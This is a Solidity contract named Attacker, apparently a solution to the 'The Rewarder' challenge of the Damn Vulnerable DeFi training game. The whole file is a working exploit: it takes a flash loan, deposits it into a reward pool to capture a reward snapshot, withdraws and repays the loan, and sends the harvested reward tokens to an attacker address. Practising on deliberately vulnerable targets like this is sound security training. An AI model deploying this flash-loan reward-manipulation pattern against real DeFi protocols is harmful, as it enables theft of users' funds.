// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import "./FlashLoanerPool.sol";
import "../DamnValuableToken.sol";
import "./TheRewarderPool.sol";
import "hardhat/console.sol";

contract Attacker {
    FlashLoanerPool private immutable loan;
    TheRewarderPool private immutable pool;
    DamnValuableToken private immutable token;
    address payable private immutable attacker;

    address owner;

    constructor(
        address loanPoolAddress,
        address rewardPoolAddress,
        address tokenAddress,
        address attackerAddress
    ) {
        loan = FlashLoanerPool(loanPoolAddress);
        owner = msg.sender;
        pool = TheRewarderPool(rewardPoolAddress);
        token = DamnValuableToken(tokenAddress);
        attacker = payable(attackerAddress);
    }

    function receiveFlashLoan(uint256 amount) external payable {
        console.log(token.balanceOf(address(this)));
        token.approve(address(pool), amount);
        pool.deposit(amount);
        pool.withdraw(amount);
        token.transfer(address(loan), amount);
        pool.rewardToken().transfer(
            attacker,
            pool.rewardToken().balanceOf(address(this))
        );
    }

    function begin() external {
        loan.flashLoan(1000000 ether);
    }

    receive() external payable {}
}
